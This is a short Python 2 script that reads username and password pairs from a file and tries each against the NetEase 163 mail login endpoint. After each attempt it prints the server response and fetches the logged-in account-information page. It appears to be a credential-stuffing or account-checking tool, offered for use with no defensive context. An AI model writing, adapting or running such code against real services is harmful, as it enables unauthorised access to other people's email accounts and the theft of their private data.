import requests
import numpy as np

training_arr = np.loadtxt('phamton.txt', str, '#', '----')

for ele in training_arr:
    url = 'https://mail.163.com/entry/cgi/ntesdoor?funcid=loginone&passtype=1&product=mail163'
    s = requests.Session()
    params = dict()
    params['username'] = ele[0]
    params['username'] = ele[0][0:len(ele[0]) - 8]
    print params['username']
    params['password'] = ele[1]

    post_response = s.post(url, params=params)
    print post_response.text
    r = s.get('https://reg.163.com/account/accountInfo.jsp')
    print  r.text  # to find it
